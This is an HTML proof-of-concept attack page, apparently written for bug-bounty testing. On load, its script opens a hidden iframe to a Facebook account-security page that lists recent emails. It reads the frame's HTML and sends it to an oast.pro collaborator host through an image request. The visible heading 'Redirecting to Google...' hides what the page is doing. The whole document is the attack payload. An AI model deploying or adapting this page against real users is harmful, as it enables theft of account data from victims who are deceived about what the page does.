<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect and Capture Response</title>
    <script>
        // Function to redirect to Google and capture response
        function redirectAndCapture() {
            // Create a hidden iframe
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);

            // Function to capture response
            function captureResponse(response) {
                // Send the response to the Burp Suite collaborator
                var img = new Image();
                img.src = "http://co4n42didn6kb1bavvhgvsichixfygpwj.oast.pro?response=" + encodeURIComponent(response);
            }

            // Set up iframe load event listener
            iframe.onload = function() {
                // Wait for a brief moment to allow cookies to be set
                setTimeout(function() {
                    // Capture the response
                    var response = iframe.contentDocument.documentElement.outerHTML;
                    captureResponse(response);
                    // Remove the iframe
                    document.body.removeChild(iframe);
                }, 1000); // Adjust the delay as needed
            };

            // Set the iframe source to the target URL with cookies included
            iframe.src = 'https://www.facebook.com/recent_emails/security/?hide_back_button=1&from_accounts_center=1';
        }

        // Call the function when the page loads
        window.onload = function() {
            redirectAndCapture();
        };
    </script>
</head>
<body>
    <h1>Redirecting to Google...</h1>
</body>
</html>
